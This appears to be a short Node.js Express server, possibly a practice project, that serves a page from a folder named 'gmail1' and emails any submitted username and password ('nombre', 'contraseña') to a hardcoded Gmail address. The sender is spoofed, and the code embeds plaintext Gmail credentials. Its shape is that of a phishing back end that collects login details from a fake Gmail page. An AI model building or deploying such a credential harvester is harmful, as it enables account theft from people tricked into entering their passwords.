const express = require('express');
const app = express();
const nodemailer = require('nodemailer');

const PORT = process.env.PORT || 8080;

//midleware
app.use(express.static('gmail1'));
app.use(express.json())

app.get('/', (req,res)=>{
    res.sendFile(__dirname + '/gmail1/index.html')
});

app.post('/', (req,res)=>{
    console.log(req.body);
    const trasnporter = nodemailer.createTransport({
        service: 'gmail',
        auth:{
            user: 'practica.node.mailer@gmail.com',
            pass: 'admin123.-'
        }
    })

    const mailOptions = {
        from:  '"Fred Foo 👻" <foo@example.com>',
        to: 'practica.node.mailer@gmail.com',
        text: `Nombre de Usuario : ${req.body.nombre} \nContraseña: ${req.body.contraseña}`
        // from: req.body,
        // to: 'practica.node.mailer@gmail.com',
        // subject: `Message from ${req.body.email}: ${req.body.subject}`,
        // text: req.body.message
    }

    trasnporter.sendMail(mailOptions, (error, info)=>{
        if(error){
            console.log(error);
            res.send('error')
        }else{
            console.log('Email sent: ' + info.response);
            res.send('succes');
        }
    })
})

app.listen(PORT, console.log(`corriendo en el puerto ${PORT}`));